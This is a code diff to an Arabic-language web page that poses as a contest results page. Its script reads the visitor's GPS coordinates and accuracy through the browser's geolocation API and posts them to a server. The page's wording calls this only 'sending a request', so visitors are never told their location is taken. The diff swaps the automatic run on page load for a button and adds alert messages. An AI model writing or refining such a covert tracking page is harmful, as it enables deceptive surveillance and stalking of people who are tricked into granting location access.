@@ -5,18 +5,20 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>مسابقة المهند</title>
 <style>
-body { font-family: Arial; text-align: center; margin-top: 40px; }
+body{font-family:Arial;text-align:center;margin-top:40px}
+button{padding:12px 20px;font-size:16px;cursor:pointer}
 </style>
 </head>
 <body>
 
 <h2> عرض النتيجة</h2>
-<p> يتم إرسال الطلب تلقائيًا إذا وافقت على الإذن.</p>
+<p> اضغط الزر ثم وافق علي الطلب</p>
+<button onclick="sendLocation()">إرسال طلب</button>
 
 <script>
 function sendLocation() {
   if (!navigator.geolocation) {
-    alert("المتصفح لا يدعم إرسال الطلبات جرب متصفح اخر");
+    alert("المتصفح لا يدعم إرسال الطلبات");
     return;
   }
 
@@ -30,15 +32,12 @@ function sendLocation() {
           acc: pos.coords.accuracy
         })
       })
-      .then(() => console.log("تم إرسال الطلب بنجاح"))
-      .catch(() => console.log("حدث خطأ أثناء الإرسال"));
+      .then(() => alert("تم إرسال الطب بنجاح"))
+      .catch(() => alert("حدث خطأ أثناء الإرسال"));
     },
-    () => console.log("تم رفض الإذن")
+    () => alert("تم رفض الإذن")
   );
 }
-
-// تنفيذ الدالة تلقائيًا عند تحميل الصفحة
-window.onload = sendLocation;
 </script>
 
 </body>
